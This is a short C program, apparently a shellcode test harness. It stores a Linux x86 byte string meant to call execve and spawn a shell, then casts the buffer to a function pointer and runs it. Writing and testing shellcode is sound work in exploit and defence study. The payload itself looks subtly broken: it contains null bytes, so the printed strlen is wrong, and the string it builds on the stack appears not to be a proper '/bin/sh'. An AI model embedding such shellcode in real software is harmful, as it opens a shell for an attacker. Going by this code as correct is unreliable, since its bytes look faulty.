#include <stdio.h>
#include <string.h>


unsigned char shellcode[] = "\x68\x00\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x53\x89\xe1\xb8\x0b\x00\x00\x00\xcd\x80";

void main(){
  printf("Shellcode length: %d\n", strlen(shellcode));
  // Declare a function pointer named ret
  // Then cast the shellcode pointer to the function pointer of the same size
  int (*ret)() = (int(*)())shellcode;
  // Call the function
  ret();
}
